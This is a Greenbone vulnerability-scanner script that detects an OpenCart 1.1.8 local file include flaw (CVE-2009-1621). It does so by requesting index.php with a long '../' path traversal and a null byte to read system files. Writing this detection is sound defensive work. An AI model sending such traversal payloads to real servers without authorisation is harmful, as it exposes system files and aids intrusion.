# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:opencart:opencart";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100179");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2009-05-02 19:46:33 +0200 (Sat, 02 May 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2009-1621");

  script_name("OpenCart 'index.php' Local File Include Vulnerability");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("opencart_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("OpenCart/installed");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Update to newer Version.");

  script_tag(name:"summary", value:"OpenCart is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input.

  An attacker can exploit this vulnerability to view files and execute
  local scripts in the context of the webserver process. This may aid
  in further attacks.

  OpenCart 1.1.8 is vulnerable, other versions may also be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34724");
  script_xref(name:"URL", value:"http://www.opencart.com/");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/index.php?route=../../../../../../../../../../../../../../../" + files[file] + "%00";
  if (http_vuln_check(port: port, url: url, pattern: file, check_header: TRUE )) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
